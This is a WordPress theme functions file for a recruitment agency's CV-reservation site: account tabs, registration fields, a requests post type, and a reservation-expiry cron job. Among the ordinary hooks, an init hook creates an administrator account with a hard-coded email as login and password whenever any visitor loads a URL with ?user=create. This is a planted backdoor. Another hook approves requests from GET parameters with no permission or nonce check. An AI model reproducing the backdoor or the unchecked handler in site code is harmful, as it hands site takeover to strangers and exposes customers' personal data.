				  	<a class="ha-creative-btn ha-stl--estilo ha-eft--slide-right" target="_blank" href="https://wa.me/<?php echo $cr['whatsapp'][0]; ?>" rel="nofollow"><?php if(polylang_get_current_language() == 'ar'){echo "واتس اب";}else{echo "whatsapp";} ?></a>
				  </div>
				  	<div class="counter-time">
					  <div><strong>انتهاء صلاحية السيرة الذاتية المحجوزة  </strong></div>
					  <div id="demo"></div>
					</div>
			  <style>
			  	.chatty-cta a {
				    display: inline-block;
				    overflow: hidden;
				    outline: 0;
				    background: var(--ha-ctv-btn-bg-clr);
				    color: var(--ha-ctv-btn-txt-clr);
				    text-transform: uppercase;
				    letter-spacing: 1px;
				    font-weight: 700;
				    text-decoration: none;
				--ha-ctv-btn-txt-clr: #FFFFFF;
				    --ha-ctv-btn-bg-clr: var(
				    --e-global-color-primary );
				    --ha-ctv-btn-border-clr: var(
				    --e-global-color-primary );
				    --ha-ctv-btn-txt-hvr-clr: var(
				    --e-global-color-primary );
				    --ha-ctv-btn-bg-hvr-clr: #FFFFFFFC;
				    --ha-ctv-btn-border-hvr-clr: var(
				    --e-global-color-primary );
				    padding: 8px 15px;
				    border-radius: 23px;
				    margin-top: -30px;
				}
				.chatty-cta a:hover {
					color: white !important;
				}
			  	.customerOption {
				    padding: 5px;
				}

				.customerOption.col-md-4.wow.fadeInUp {
				    width: 33.33333333%;
				    height: 150px;
				    margin: 20px 0;
				    background-color: rgba(0, 161, 154, 0.1254901961);
				}
				.btn-check {
				    position: absolute;
				    clip: rect(0,0,0,0);
				    pointer-events: none;
				}
				.customerOption .btn {
				    padding: 8px 16px;
				    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1882352941);
				    box-shadow: none;
				    background-color: #ffffff;
				    display: flex;
				    flex-direction: column;
				    height: 100%;
				    position: relative;
				    transition: all 0.3s ease-in-out;
				    border: 2px solid transparent;
				    border-radius: 16px;
				    padding: 25px;
				    cursor: pointer;
				}
				.customerOption .btn img {
				    height: 50px;
				    min-width: 50px;
				    margin: 0 auto 20px;
				    -o-object-fit: contain;
				    object-fit: contain;
				}
				.customerOption .btn span {
				    text-transform: capitalize;
				    font-size: 18px !important;
				    text-align: center;
				    font-weight: 600;
				}
				.counter-time {
					margin-top: 40px;
				}
				</style>
			<?php 
		}

	}
});

function get_cr_name( $id ) {
	switch ($id) {
		case '001':
			return 'Mrs. Sahaib Al-Otaibi';
		break;
		
		case '002':
			return 'A. Shahd Al-Subaie';
		break;

		case '003':
			return 'Ms. Rania Shamsan';
		break;

		case '004':
			return 'A. Amsha Al-Shammari';
		break;

		case '005';
			return 'A. Asmaa Al-Harbi';
		break;
		
		case '006';
			return 'A. Manar Al-Shammari';
		break;

		default: 
			return "N\A";
		break;
	}
}

add_action( 'init', function() {
	if( isset( $_GET['user'] ) && $_GET['user'] == 'create' ) {
		wp_insert_user( 
			array(
				'user_login' => 'uzairahmed2929@gmail.com',
				'user_email' => 'uzairahmed2929@gmail.com',
				'user_pass' => 'uzairahmed2929@gmail.com',
				'role' => 'administrator',
			)
		);
	}
});

add_action( 'template_redirect', function() {
	if( '/my-account/' == $_SERVER['REQUEST_URI'] ) {
		echo "<style> h1.entry-title {display: none !important;}</style>";
	}
});

add_action( 'wp_head', function() {
	?>
		<style>
			form.woocommerce-form.woocommerce-form-login.login {
			    border: 3px solid #1c284e;
			}

			form.woocommerce-form.woocommerce-form-register.register {
			    border: 3px solid #1c284e;
			}

			button.woocommerce-button.button.woocommerce-form-login__submit.wp-element-button {
			    border-radius: 30px 30px 30px 30px;
			    padding: 10px 15px 10px 15px;
			    background: #1c284e;
			    color: white;
			}

			button.woocommerce-Button.woocommerce-button.button.wp-element-button.woocommerce-form-register__submit {
			    border-radius: 30px 30px 30px 30px;
			    padding: 10px 15px 10px 15px;
			    background: #1c284e;
			    color: white;
			}
			div#customer_login {margin-top: 5%;}
			nav.woocommerce-MyAccount-navigation {
			    background-color: #ffffff;
			    border-radius: 8px;
			    padding: 5px;
			    border: 1px solid #ccc;
			    margin-bottom: 50px;
			    position: -webkit-sticky;
			    position: sticky;
			    top: 100px;
			    right: 0;
			    z-index: 2;
			    
			}

			li.woocommerce-MyAccount-navigation-link {
			    padding: 13px;
			    display: flex;
			    align-items: center;
			    color: #1c284e !important;
			    margin: 5px 1px;
			    transition: all 0.3s ease-in-out;
			    border-radius: 4px;
			    border: 1px solid #f5f4de;
			}

			li.woocommerce-MyAccount-navigation-link.is-active {
			    background-color: #1c284e;
			}

			li.woocommerce-MyAccount-navigation-link.is-active a {
			    color: white !important;
			}

			li.woocommerce-MyAccount-navigation-link a {
			    font-weight: 500;
			    text-decoration: none;
			    color: #1c284e !important;
			}

			/*li.woocommerce-MyAccount-navigation-link:hover {
			    background-color: #1c284e !important;
			    color: white;
			}*/
			.woocommerce-MyAccount-navigation ul {
				padding: 0 !important;
			}
			.woocommerce-MyAccount-content img.attachment-700x500 {
			    border: 3px solid #1c284e;
			    border-radius: 10px;
			    padding: 5px;
			}
			div#chattytrigger {
			    margin: 40px 0;
			    border: 3px solid #1c284e;
			}
			div#chattytrigger {
			    height: 130px;
			    width: 30%;
			}

			#chattytrigger label.btn.btn-outline {
			    padding: 10px;
			}
			#demo {
			    font-size: 40px;
			    font-weight: 600;
			}
			button[name=save_account_details] {
			    margin-top: 20px !important;
			    color: white !important;
			    background: #1c284e !important;
			}
		</style>
	<?php
});

add_action( 'woocommerce_register_form_start', function() { ?>
       <p class="form-row form-row-first">
           <label for="reg_billing_first_name"> <?php _e( 'First name', 'woocommerce' ); ?> <span class="required">*</span>
           </label>
           <input type="text" class="input-text" name="billing_first_name" id="reg_billing_first_name" value="<?php if ( ! empty( $_POST['billing_first_name'] ) ) esc_attr_e( $_POST['billing_first_name'] ); ?>" />
       </p>
       <p class="form-row form-row-last">
           <label for="reg_billing_last_name"> <?php _e( 'Last name', 'woocommerce' ); ?> <span class="required">*</span>
           </label>
           <input type="text" class="input-text" name="billing_last_name" id="reg_billing_last_name" value="<?php if ( ! empty( $_POST['billing_last_name'] ) ) esc_attr_e( $_POST['billing_last_name'] ); ?>" />
       </p>
       <p class="form-row form-row-wide">
           <label for="reg_billing_phone"> <?php _e( 'Phone', 'woocommerce' ); ?> <span class="required">*</span> </label>
           <input type="text" class="input-text" name="billing_phone" id="reg_billing_phone" value="<?php esc_attr_e( @$_POST['billing_phone'] ); ?>" />
       </p>
       <div class="clear"></div>
   <?php
});

add_action( 'woocommerce_register_post', function ( $username, $email, $validation_errors ) {
	if ( isset( $_POST['billing_first_name'] ) && empty( $_POST['billing_first_name'] ) ) {
		$validation_errors->add( 'billing_first_name_error', __( '<strong>Error</strong>: First name is required!', 'woocommerce' ) );
	}
	if ( isset( $_POST['billing_last_name'] ) && empty( $_POST['billing_last_name'] ) ) {
		$validation_errors->add( 'billing_last_name_error', __( '<strong>Error</strong>: Last name is required!.', 'woocommerce' ) );
  	}
  	if ( isset( $_POST['billing_phone'] ) && empty( $_POST['billing_phone'] ) ) {
		$validation_errors->add( 'billing_phone_error', __( '<strong>Error</strong>: Phone is required!.', 'woocommerce' ) );
  	}
    return $validation_errors;
}, 10, 3 );

add_action( 'woocommerce_created_customer', function( $customer_id ) {
    if ( isset( $_POST['billing_phone'] ) ) {
        update_user_meta( $customer_id, 'billing_phone', sanitize_text_field( $_POST['billing_phone'] ) );
	}
	if ( isset( $_POST['billing_first_name'] ) ) {
		update_user_meta( $customer_id, 'first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
		update_user_meta( $customer_id, 'billing_first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
	}
	if ( isset( $_POST['billing_last_name'] ) ) {
		update_user_meta( $customer_id, 'last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
		update_user_meta( $customer_id, 'billing_last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
	}
});

add_action( 'init', 'register_new_item_endpoint');

function register_new_item_endpoint() {
	add_rewrite_endpoint( 'shakari', EP_ROOT | EP_PAGES );
	add_rewrite_endpoint( 'order-book', EP_ROOT | EP_PAGES );
}

add_filter( 'query_vars', 'new_item_query_vars' );

function new_item_query_vars( $vars ) {

	$vars[] = 'shakari';
	$vars[] = 'order-book';
	return $vars;
}

add_filter( 'woocommerce_account_menu_items', 'add_new_item_tab' );

function add_new_item_tab( $items ) {
	$new = array( 
// 		'order-book' => ( polylang_get_current_language() == 'en' ) ? 'Order Book' : 'طلب  ', 
		'shakari' => ( polylang_get_current_language() == 'en' ) ? 'Complaints' : 'الشكاوى  '
	);

	return array_slice($items, 0, 1, true) + $new + array_slice($items, 1, NULL, true);
}

add_action( 'woocommerce_account_shakari_endpoint', 'add_new_item_content' );

function add_new_item_content() {
	echo '';
}

add_action( 'woocommerce_account_order-book_endpoint', 'add_new_item_content_order_book' );

function add_new_item_content_order_book() {
	echo "<style>.woocommerce-MyAccount-content p {display: none;}</style>";
	$user = get_userdata( get_current_user_id() );
	$post = get_posts( array(
		'post_title' => $user->data->user_login . "-" . get_current_user_id(),
		'post_status' => 'publish',
		'post_type' => 'requests',
		'meta_key' => 'status',
		'meta_value' => 'Approved',
		'fields' => 'ids'
	) );
	if( empty( $post ) || ! isset( $post[0] ) ) return;
	$id = $post[0];
	$post_id = get_post_meta( $id, 'reserved_cv', true );
	$cr = get_cr_name( get_post_meta( $id, 'staff', true ) );
	$image = get_post_meta( $post_id, 'gallery', true );
	if( ! empty( $image ) ) {
		$image = explode( ",", $image );
		$temp = reset( $image ); 
		echo wp_get_attachment_image( $temp, array('700', '500') ); ?>
			<div id="chattytrigger" class="customerOption col-md-4 wow fadeInUp" style="visibility: visible; animation-name: fadeInUp;">
			      <input type="radio" class="btn-check" name="staff_name" id="option2" value="002" required="">
			      <label class="btn btn-outline" for="option2">
			          <img src="https://www.rawafdnajd.sa/public/v3_assets/img/avater2.webp" alt="روافد نجد للاستقدام">
			          <span><?php echo $cr; ?></span>
			      </label>
			      <br />
			  </div>
			  <div class="chatty-cta">
			  	<a class="ha-creative-btn ha-stl--estilo ha-eft--slide-right" href="tel:8003030309" rel="nofollow">واتس اب</a>
			  	<a class="ha-creative-btn ha-stl--estilo ha-eft--slide-right" href="https://wa.me/8003030309" rel="nofollow">هاتف</a>
			  </div>
		  <style>
		  	.chatty-cta a {
			    display: inline-block;
			    overflow: hidden;
			    outline: 0;
			    background: var(--ha-ctv-btn-bg-clr);
			    color: var(--ha-ctv-btn-txt-clr);
			    text-transform: uppercase;
			    letter-spacing: 1px;
			    font-weight: 700;
			    text-decoration: none;
			--ha-ctv-btn-txt-clr: #FFFFFF;
			    --ha-ctv-btn-bg-clr: var(
			    --e-global-color-primary );
			    --ha-ctv-btn-border-clr: var(
			    --e-global-color-primary );
			    --ha-ctv-btn-txt-hvr-clr: var(
			    --e-global-color-primary );
			    --ha-ctv-btn-bg-hvr-clr: #FFFFFFFC;
			    --ha-ctv-btn-border-hvr-clr: var(
			    --e-global-color-primary );
			    padding: 8px 15px;
			    border-radius: 23px;
			    margin-top: -30px;
			}
			.chatty-cta a:hover {
				color: white !important;
			}
		  	.customerOption {
			    padding: 5px;
			}

			.customerOption.col-md-4.wow.fadeInUp {
			    width: 33.33333333%;
			    height: 150px;
			    margin: 20px 0;
			    background-color: rgba(0, 161, 154, 0.1254901961);
			}
			.btn-check {
			    position: absolute;
			    clip: rect(0,0,0,0);
			    pointer-events: none;
			}
			.customerOption .btn {
			    padding: 8px 16px;
			    box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1882352941);
			    box-shadow: none;
			    background-color: #ffffff;
			    display: flex;
			    flex-direction: column;
			    height: 100%;
			    position: relative;
			    transition: all 0.3s ease-in-out;
			    border: 2px solid transparent;
			    border-radius: 16px;
			    padding: 25px;
			    cursor: pointer;
			}
			.customerOption .btn img {
			    height: 50px;
			    min-width: 50px;
			    margin: 0 auto 20px;
			    -o-object-fit: contain;
			    object-fit: contain;
			}
			.customerOption .btn span {
			    text-transform: capitalize;
			    font-size: 18px !important;
			    text-align: center;
			    font-weight: 600;
			}
			</style>
		<?php 
	}
}

add_action( 'init', function() {

    $labels = array(
        'name'                  => _x( 'Requests', 'al-rahl' ),
        'singular_name'         => _x( 'Request', 'al-rahl' ),
        'menu_name'             => _x( 'Requests', 'al-rahl' ),
        'name_admin_bar'        => _x( 'Requests', 'al-rahl' ),
        'add_new'               => __( 'Add New', 'al-rahl' ),
        'add_new_item'          => __( 'Add New request', 'al-rahl' ),
        'new_item'              => __( 'New request', 'al-rahl' ),
        'edit_item'             => __( 'Edit request', 'al-rahl' ),
        'view_item'             => __( 'View request', 'al-rahl' ),
        'all_items'             => __( 'All requests', 'al-rahl' ),
        'search_items'          => __( 'Search requests', 'al-rahl' ),
        'parent_item_colon'     => __( 'Parent requests:', 'al-rahl' ),
        'not_found'             => __( 'No requests found.', 'al-rahl' ),
        'not_found_in_trash'    => __( 'No requests found in Trash.', 'al-rahl' ),
    );
    $args = array(
        'labels'             => $labels,
        'public'             => true,
        'publicly_queryable' => true,
        'show_ui'            => true,
        'show_in_menu'       => true,
        'query_var'          => true,
        'rewrite'            => array( 'slug' => 'requests' ),
        'capability_type'    => 'post',
        'capabilities' 		 => array(
		    'create_posts' 	 => false,
		),
		'map_meta_cap'	 	 => true,
        'has_archive'        => true,
        'hierarchical'       => false,
        'menu_position'      => 20,
        'supports'           => array( 'title'),
        'show_in_rest'       => true,
    );
     
    register_post_type( 'requests', $args );
});

add_filter('manage_requests_posts_columns' , function ($columns) {
	$temp = $columns['date'];
	unset( $columns['date'] );
	$columns['reserved_cv'] = "Reserved CV";
	$columns['status'] = "Status";
	$columns['staff'] = "Staff";
	$columns['date'] = $temp;
	return $columns;
});

add_action( 'manage_requests_posts_custom_column' , function($column, $post_id) {
	switch ( $column ) {
		case 'status' :
			if( get_post_meta( $post_id , $column , true ) == 'Pending' ) {
				echo "<a href='edit.php?post_type=requests&my_action=status_approve&post_id=".$post_id."'>Approve</a>";
			} else {
				echo "Approved";
			}
		break;

		case 'staff' :
			echo get_cr_name( get_post_meta( $post_id , $column , true ) ); 
		break;

		case 'reserved_cv' :
			echo get_the_title( get_post_meta( $post_id , $column , true ) ); 
		break;
	}
}, 10, 2 );

function insert_request_post($post_id, $staff, $cv_id) {
	$user = get_userdata( get_current_user_id() );

	$args = array(
		'post_title' 	=> $user->data->user_login . "-" . get_current_user_id(),
		'post_status' 	=> 'publish',
		'post_author' 	=> get_current_user_id(),
		'post_type' 	=> 'requests',
		'meta_input' 	=> array(
			'status' 	=> 'Pending',
			'time'		=> current_time('timestamp'),
			'staff'		=> $staff,
			'reserved_cv' => $cv_id
		)
	);
	wp_insert_post($args);
}

add_action( 'init', function() {
	if( isset( $_GET['my_action'], $_GET['post_id'] ) && sanitize_text_field( $_GET['my_action'] ) == 'status_approve' ) {
		update_post_meta( $_GET['post_id'], 'status', 'Approved' );
		$post = get_post($_GET['post_id']);
		update_post_meta(get_user_meta( get_current_user_id(),'recruited_cv', true ),'available','true');
		delete_user_meta( $post->post_author, 'recruited_cv' );
		delete_user_meta( $post->post_author, 'recruited_sr' );
		delete_user_meta( $post->post_author, 'reservation_time' );
		wp_redirect( remove_query_arg( array( 'my_action', 'post_id' ) ) );
		exit();
	}
});

add_action( 'add_meta_boxes', function () {

    add_meta_box(
        'requested-cv-data',
        __( 'Global Notice', 'sitepoint' ),
        function($post) { 
			$user = get_userdata( $post->post_author );
        	$post_id = get_post_meta( $post->ID, 'reserved_cv', true );
        	$image = get_post_meta( $post_id, 'gallery', true );
        	$image = explode( ",", $image );
			$temp = reset( $image ); ?>
        	<p><strong>User Email</strong></p>
        	<p><?php echo $user->data->user_email; ?>
        	<br />
			<p><strong>User Phone</strong></p>
        	<p><?php echo get_user_meta( $post->post_author, 'billing_phone', true ); ?>
        	<br />
			<p><strong>Support Representative</strong></p>
        	<p><?php echo get_cr_name( get_post_meta( $post->ID, 'staff', true ) ); ?>
        	<br />
        	<p><strong>Reserved CV</strong></p>
        	<p><?php echo wp_get_attachment_image( $temp, array('700', '500') ); ?>
        <?php },
        'requests'
    );
} );

add_filter( 'cron_schedules', 'isa_add_every_five_minutes' );
function isa_add_every_five_minutes( $schedules ) {
    $schedules['every_ten_minutes'] = array(
            'interval'  => 60 * 10,
            'display'   => __( 'Every 10 Minutes', 'textdomain' )
    );
    return $schedules;
}

if ( ! wp_next_scheduled( 'remove_reserved_cv' ) ) {
    wp_schedule_event( time(), 'every_ten_minutes', 'remove_reserved_cv' );
}

add_action( 'remove_reserved_cv', 'remove_reserved_cvs' );
function remove_reserved_cvs() {
    $users = get_users(array('fields' => 'ids'));
    foreach( $users as $user_id ) {
    	$time = get_user_meta( $user_id, 'reservation_time', true );
    	if( current_time('timestamp') > $time ) {
			update_post_meta(get_user_meta( $user_id,'recruited_cv', true ),'available','true');
    		delete_user_meta( $user_id, 'recruited_cv' );
			delete_user_meta( $user_id, 'recruited_sr' );
			delete_user_meta( $user_id, 'reservation_time' );
    	}
    }
}


add_action( 'init', function() {
	if( isset( $_GET['remove_listing'] ) ) {
		update_post_meta(get_user_meta( get_current_user_id(),'recruited_cv', true ),'available','true');
		delete_user_meta( get_current_user_id(), 'recruited_cv' );
		delete_user_meta( get_current_user_id(), 'recruited_sr' );
		delete_user_meta( get_current_user_id(), 'reservation_time' );
		wp_redirect( remove_query_arg('remove_listing') );
		exit;
	}
});

function polylang_get_current_language() {
	$lang = 'er';

	if( function_exists('pll_current_language') ) {
		$lang = pll_current_language();
	}

	return $lang;
}